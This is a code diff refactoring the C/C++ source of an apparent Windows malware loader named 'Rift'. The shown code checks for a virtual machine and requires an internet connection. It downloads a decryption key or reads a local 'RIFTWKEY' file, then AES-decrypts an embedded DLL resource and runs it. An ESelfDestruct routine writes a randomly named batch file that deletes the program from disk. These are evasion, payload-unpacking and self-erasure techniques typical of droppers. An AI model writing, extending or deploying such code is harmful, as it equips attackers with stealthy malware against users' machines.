@@ -2,8 +2,8 @@
 
 typedef status(WINAPI* DllEntry)(
 	_In_ HINSTANCE hinstDLL,
-	_In_ DWORD fdwReason,
-	_In_ void* pvReserved
+	_In_ dword     fdwReason,
+	_In_ void*     pvReserved
 );
 
 int WINAPI wWinMain(
@@ -15,15 +15,12 @@ int WINAPI wWinMain(
 	UNREFERENCED_PARAMETER(hPrevInstance);
 	UNREFERENCED_PARAMETER(nCmdShow);
 	{	// Initialize Process Information Block
-		g_PIB->sMod.hMH = hInstance;
+		g_PIB->sMod.hM = hInstance;
 		GetCurrentDirectoryW(MAX_PATH, g_PIB->sMod.szCD);
-		EXoshiroBegin(NULL);
-		IGenerateHardwareId(&g_PIB->sID.HW);
-		IGenerateSessionId(&g_PIB->sID.SE);
+		utl::IGenerateHardwareId(&g_PIB->sID.HW);
+		utl::IGenerateSessionId(&g_PIB->sID.SE);
 		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, (int*)&g_PIB->sArg.n);
 	}
-
-
 
 	// WCHAR UUid[UUID_STRLEN + 1];
 	// EUidToStringW(&g_PIB->sID.HW, UUid, UUID_STRLEN);
@@ -58,7 +55,7 @@ int WINAPI wWinMain(
 	IOpenConsole();
 	BOOL bVM = ICheckVmPresent();
 	{
-		DWORD dwS = InternetAttemptConnect(NULL);
+		dword dwS = InternetAttemptConnect(NULL);
 		if (dwS) {
 			EPrintFW(L"Couldn't connect to Internet-Services.\nSoftware blocks further execution!\n", CON_WARNING);
 			dwS = ReadConsoleW(GetStdHandle(STD_INPUT_HANDLE), NULL, 0, NULL, NULL);
@@ -67,19 +64,19 @@ int WINAPI wWinMain(
 		}
 	}
 
-	void* pWKey = IDownloadKey();
+	void* pWKey = utl::IDownloadKey();
 	if (!pWKey) {
 		PWSTR szKeyBlob = (PWSTR)malloc(MAX_PATH);
 		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->sMod.szCD, L"RIFTWKEY"); // Temporery
-		DWORD nKeyBlob;
-		pWKey = AllocReadFileW(szKeyBlob, &nKeyBlob);
+		dword nKeyBlob;
+		pWKey = utl::AllocReadFileW(szKeyBlob, (size_t*)&nKeyBlob);
 	} if (pWKey)
-		ECryptBegin(pWKey, &g_PIB->sCIB.WK);
+		g_PIB->sCry.EK = new cry::Aes(pWKey);
 	else
 		return 0x45e0;
 
 	size_t nDll;
-	void* pDll = EUnpackResource(&g_PIB->sCIB.WK, IDR_RIFTDLL, &nDll);
+	void* pDll = cry::EUnpackResource(IDR_RIFTDLL, &nDll);
 	if (!pDll)
 		return 0x132d;
 
@@ -99,7 +96,7 @@ int WINAPI wWinMain(
 	free(pDll);
 
 	{	// CleanUp
-		EXoshiroEnd(NULL);
+		rng::Xoshiro::Instance(true);
 		LocalFree(g_PIB->sArg.v);
 		HeapFree(g_PIB->hPH, NULL, g_PIB);
 	} return 0;
@@ -122,25 +119,25 @@ const static WCHAR l_szSelfDelBat[] = {
 VOID ESelfDestruct() {
 	// Prepare String for Filename of Batchfile
 	PWSTR szFilePath = (PWSTR)malloc(MAX_PATH * sizeof(WCHAR));
-	PCWSTR szRandom = EAllocRandomPathW(NULL, 8, 16);
+	PCWSTR szRandom = rng::EAllocRandomPathW(NULL, 8, 16);
 	CopyMemory(szFilePath, g_PIB->sMod.szCD, MAX_PATH * sizeof(WCHAR));
 	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
 	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");
 
 	// Prepare Script content
 	void* pScriptW = malloc(0x800);
-	uint uiRandomID = EXoshiroSS(NULL);
-	PCWSTR szMFN = GetFileNameFromPathW(g_PIB->sMod.szMFN);
-	StringCchPrintfW(pScriptW, 0x400, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, GetFileNameFromPathW(szFilePath));
+	uint uiRandomID = rng::Xoshiro::Instance()->EXoshiroSS();
+	PCWSTR szMFN = utl::GetFileNameFromPathW(g_PIB->sMod.szMFN);
+	StringCchPrintfW((PWSTR)pScriptW, 0x400, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, utl::GetFileNameFromPathW(szFilePath));
 
 	// Convert to Raw (ANSI)
 	size_t nScript;
-	StringCchLengthW(pScriptW, 0x400, &nScript);
-	PSTR pScriptA = malloc(0x400);
-	WideCharToMultiByte(CP_ACP, NULL, pScriptW, -1, pScriptA, 0x400, NULL, NULL);
+	StringCchLengthW((PWSTR)pScriptW, 0x400, &nScript);
+	PSTR pScriptA = (PSTR)malloc(0x400);
+	WideCharToMultiByte(CP_ACP, NULL, (PWSTR)pScriptW, -1, pScriptA, 0x400, NULL, NULL);
 	free(pScriptW);
 
 	// Write to Disk
-	WriteFileCW(szFilePath, pScriptA, nScript);
+	utl::WriteFileCW(szFilePath, pScriptA, nScript);
 	free(pScriptA);
 }
